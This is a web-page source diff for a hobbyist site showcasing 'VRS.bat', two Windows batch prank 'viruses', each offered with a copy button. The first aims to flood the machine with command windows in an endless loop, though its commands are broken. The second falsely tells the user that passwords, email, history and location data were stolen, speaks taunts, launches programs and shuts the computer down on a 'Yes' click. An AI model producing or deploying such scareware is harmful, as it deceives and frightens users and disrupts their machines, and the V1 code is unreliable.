@@ -1,0 +1,145 @@
+<head>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Lexend+Deca:wght@100..900&display=swap');
+      </style>
+    
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Lexend+Deca&display=swap" rel="stylesheet">
+    <meta charset="UTF-8">
+    <title>A1dos Creations - VRS</title>
+    <link rel="icon" type="image/x-icon" href="MainFavicon.png">
+    <link rel="stylesheet" href="./styles.css">
+    <script defer src="app.js"></script>
+
+    <nav>
+        <a href="index.html">
+          <img src="MainFavicon.png" style="height: 45px;width: auto;border-radius: 4px;border-width: 2px;">
+        </a>
+        <a href="./account/auth" id="login-button" style="background-color: rgba(0, 0, 0, 0);text-decoration: none;"onclick="">
+          <button class="navItems" id="loginTxt" style="font-family: Lexend Deca, serif;">Login</button>
+        </a>
+    </nav>
+</head>
+<body style="justify-items: center;">
+    <canvas id="starsCanvas"></canvas>
+    <script src="deco.js"></script>
+    <h1 class="hidden">< VRS.bat ></h1>
+    <section class="hidden" id="aboutVRS.bat">
+        <div>
+            <h2>What is VRS.bat?</h2>
+            <p style="max-width: 600px;min-width: 200px;font-family: Lexend Deca;text-wrap-style: pretty;text-indent: 30px;">VRS.bat was a small side project I created early this year. It was a harmless virus that said hello! (Seriously, thats all it did) I was bored one monday afternoon, and kept seeing youtube videos about making harmless viruses. I decided to try it out myself. The first one I made crashed my computer. The second one was more complicated, both of the viruses' code is below. ;)</p>
+        </div>
+    </section>
+    <h2 class="hidden" style="transition-delay: 0.25s;-webkit-transition-delay: 0.25s;">VRS.bat V1</h2>
+    <p class="hidden" style="transition-delay: 0.2s;-webkit-transition-delay: 0.2s;text-align: center;font-family: Lexend Deca;max-width: 800px;min-width: 300px;"><b style="color: red;">WARNING:</b> This version of VRS can crash your computer and cause memory/ram issues. This version also cannot be stopped once it is started. Use at your own risk.</p>
+    <section id="codeV1" class="hidden" style="background-color: rgba(48, 48, 48, 0.438);max-width:1000px;justify-self: center;min-width: 600px;border-radius: 20px;border-style: solid;">
+        <button id="copyBtn" style="background-color: transparent;outline: none;border: none;border-radius: none;border-style: none;justify-items: right;justify-self: right;margin-right: 0.1vw;margin-top: 0.8vh;"><img src="./copy.png" style="width: 30px;border: none;justify-self: right;"></button>
+
+        <pre style="background-color: transparent;">
+            <code style="padding: 15px;" id="codeBlock">
+@echo off
+echo Your computer has been infected by VRS. RIP.
+goto loop
+
+:loop
+open cmd
+open cmd
+open cmd
+goto loop
+            </code>
+        </pre>
+    </section>
+
+    <h2 class="hidden">VRS.bat V2</h2>
+    <p class="hidden" style="transition-delay: 0.2s;-webkit-transition-delay: 0.2s;text-align: center;font-family: Lexend Deca;max-width: 800px;min-width: 300px;"><b style="color: red;">WARNING:</b> Clicking 'Yes' on the popup (message box that appears after running the program) your computer will shutdown. This script <i>cannot</i> steal any information.</p>
+    <section id="codeV1" class="hidden" style="background-color: rgba(48, 48, 48, 0.438);max-width:1000px;justify-self: center;min-width: 600px;border-radius: 20px;border-style: solid;margin-top: 0.9%;margin-bottom: 5%;">
+        <button id="copyBtn2" style="background-color: transparent;outline: none;border: none;border-radius: none;border-style: none;justify-items: right;justify-self: right;margin-right: 0.1vw;margin-top: 0.8vh;"><img src="./copy.png" style="width: 30px;border: none;justify-self: right;"></button>
+        <pre style="background-color: transparent;">
+            <code style="padding: 15px;" id="codeBlock2">
+                @echo off
+                :1
+                color 4
+                echo Hi. Do you want to get hacked? (answer yes/no)
+                call :speak "Hi. Do you want to get hacked? Answer yes or no."
+                set /p input=
+                if /i "%input%"=="yes" goto hate
+                if /i "%input%"=="no" goto no
+                
+                :no
+                echo I don't belive you
+                call :speak "I DONT BELIVE YOU."
+                goto loop
+                
+                :hate
+                echo Ok... if that's how you want it to be
+                call :speak "Ok... if thats how you want it to be."
+                echo You've been hacked... hehehe
+                call :speak "You've been hacked. Ha Ha Ha!"
+                echo Your computer will dissolve in...
+                call :speak "Your computer will dissolve in 10 seconds."
+                timeout /t 10 /nobreak
+                goto loop
+                
+                :loop
+                start notepad
+                start cmd
+                start explorer
+                call :msgbox "Your system has been compromised along with the following values: Password. Email. History. IP Data. 
+            Location Data.", "Warning"
+                
+                :speak
+                powershell -c "$speak=New-Object -ComObject SAPI.SpVoice; $speak.Speak('%~1')"
+                exit /b
+                
+                :msgbox
+                echo Set objShell = CreateObject("WScript.Shell") > msgbox.vbs
+                echo response = objShell.Popup("%~1", 0, "%~2", 48 + 4) >> msgbox.vbs
+                echo If response = 6 Then objShell.Run "shutdown -s -t 5 -c ""Hacked!""" >> msgbox.vbs
+                echo If response = 7 Then objShell.Popup "You chose No!", 0, "Error", 16 >> msgbox.vbs
+                wscript msgbox.vbs
+                del msgbox.vbs
+                exit /b
+                
+            </code>
+        </pre>
+    </section>
+
+    <section>
+        <p style="min-width: 200px;max-width: max-content;font-family: Lexend Deca;opacity: .7;">I do not promote the making of, distribution of, or malicious use of viruses. Please use these code snippets legally. </p>
+    </section>
+
+    <script> // Copy Code to Clipboard
+        
+        const codeBlock = document.getElementById('codeBlock');
+        const copyBtn = document.getElementById('copyBtn');
+
+        const codeBlock2 = document.getElementById('codeBlock2');
+        const copyBtn2 = document.getElementById('copyBtn2');
+    
+        // Top Button Copy Code
+        copyBtn.addEventListener('click', () => {
+          navigator.clipboard.writeText(codeBlock.innerText)
+            .then(() => {
+              alert('Code copied to clipboard!');
+            })
+            .catch(err => {
+              console.error('Failed to copy text: ', err);
+              alert('Failed to copy code. Please try again.');
+            });
+        });
+
+        // Bottom Button Copy Code
+        copyBtn2.addEventListener('click', () => {
+          navigator.clipboard.writeText(codeBlock2.innerText)
+            .then(() => {
+              alert('Code copied to clipboard!');
+            })
+            .catch(err => {
+              console.error('Failed to copy text: ', err);
+              alert('Failed to copy code. Please try again.');
+            });
+        });
+      </script>
+
+</body>
